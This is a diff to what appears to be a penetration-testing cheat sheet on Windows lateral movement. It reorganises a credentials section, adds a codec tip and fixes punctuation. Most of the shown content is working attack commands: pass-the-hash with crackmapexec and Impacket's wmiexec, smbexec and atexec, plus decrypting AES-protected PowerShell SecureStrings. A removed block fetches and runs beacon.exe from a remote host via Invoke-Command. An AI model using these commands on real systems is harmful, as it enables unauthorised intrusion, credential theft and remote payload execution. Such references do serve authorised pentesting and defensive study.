@@ -9,9 +9,10 @@
 * [Metasploit](#metasploit)
     * [Metasploit - SMB](#metasploit---smb)
     * [Metasploit - Psexec](#metasploit---psexec)
-* [Remote Code Execution with PS Credentials](#remote-code-execution-with-ps-credentials)
 * [WinRM](#winrm)
 * [Powershell Remoting](#powershell-remoting)
+    * [Powershell Credentials](#powershell-credentials)
+    * [Powershell Secure String](#powershell-secure-strings)
 * [Crackmapexec](#crackmapexec)
 * [Winexe](#winexe)
 * [WMI](#wmi)
@@ -121,16 +122,6 @@ root@payload$ cme smb 192.168.1.100 -u Administrator -H ":5858d47a41e40b40f294b3
 root@payload$ cme smb 192.168.1.100 -u Administrator -H ":5858d47a41e40b40f294b3100bea611f" --exec-method smbexec -x 'whoami'
 ```
 
-## Remote Code Execution with PS Credentials
-
-```powershell
-PS C:\> $SecPassword = ConvertTo-SecureString 'secretpassword' -AsPlainText -Force
-PS C:\> $Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\USERNAME', $SecPassword)
-PS C:\> Invoke-Command -ComputerName DC01 -Credential $Cred -ScriptBlock {whoami}
-PS C:\> New-PSSESSION -NAME PSDC -ComputerName COMPUTER01; Invoke-Command -ComputerName COMPUTER01 -ScriptBlock {whoami}
-PS C:\> Invoke-Command -ComputerName COMPUTER01 -ScriptBlock {powershell Invoke-WebRequest -Uri 'http://10.10.10.10/beacon.exe' -OutFile 'C:\Temp\beacon.exe'; Start-Process -wait C:\Temp\beacon.exe}
-```
-
 ## WinRM
 
 Require:
@@ -173,7 +164,6 @@ conn.shell(:powershell) do |shell|
 end
 ```
 
-
 ## Powershell Remoting
 
 > PSSESSION
@@ -201,6 +191,23 @@ PS> Invoke-Command -computername DC01,CLIENT1 -scriptBlock { Get-Service }
 PS> Invoke-Command -computername DC01,CLIENT1 -filePath c:\Scripts\Task.ps1
 ```
 
+### Powershell Credentials
+
+```ps1
+PS> $pass = ConvertTo-SecureString 'supersecurepassword' -AsPlainText -Force
+PS> $cred = New-Object System.Management.Automation.PSCredential ('DOMAIN\Username', $pass)
+```
+
+### Powershell Secure String
+
+```ps1
+$aesKey = (49, 222, 253, 86, 26, 137, 92, 43, 29, 200, 17, 203, 88, 97, 39, 38, 60, 119, 46, 44, 219, 179, 13, 194, 191, 199, 78, 10, 4, 40, 87, 159)
+$secureObject = ConvertTo-SecureString -String "76492d11167[SNIP]MwA4AGEAYwA1AGMAZgA=" -Key $aesKey
+$decrypted = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($secureObject)
+$decrypted = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($decrypted)
+$decrypted
+```
+
 
 ## Winexe 
 
@@ -219,7 +226,8 @@ PS C:\> wmic /node:target.domain /user:domain\user /password:password process ca
 ## Psexec.py / Smbexec.py / Wmiexec.py 
 
 From [Impacket](https://github.com/SecureAuthCorp/impacket) (:warning: renamed to impacket-xxx in Kali)
-:warning: `get` / `put` for wmiexec, psexec, smbexec, and dcomexec are changing to `lget` and `lput`.
+:warning: `get` / `put` for wmiexec, psexec, smbexec, and dcomexec are changing to `lget` and `lput`.    
+:warning: French characters might not be correctly displayed on your output, use `-codec ibm850` to fix this.
 
 ```powershell
 root@payload$ git clone https://github.com/CoreSecurity/impacket.git
@@ -234,7 +242,6 @@ root@payload$ python smbexec.py DOMAIN/username:password@10.10.10.10
 # A semi-interactive shell, used through Windows Management Instrumentation. 
 root@payload$ python wmiexec.py DOMAIN/username:password@10.10.10.10
 root@payload$ wmiexec.py domain.local/user@10.0.0.20 -hashes aad3b435b51404eeaad3b435b51404ee:BD1C6503987F8FF006296118F359FA79
-
 
 # A semi-interactive shell similar to wmiexec.py, but using different DCOM endpoints. 
 root@payload$ python atexec.py DOMAIN/username:password@10.10.10.10
@@ -328,7 +335,7 @@ klist
 
 ## SSH
 
-:warning: You cannot pass the hash to SSH, but you can connect with a Kerberos ticket (Which you can get by passing the hash!
+:warning: You cannot pass the hash to SSH, but you can connect with a Kerberos ticket (Which you can get by passing the hash!)
 
 ```ps1
 cp user.ccache /tmp/krb5cc_1045
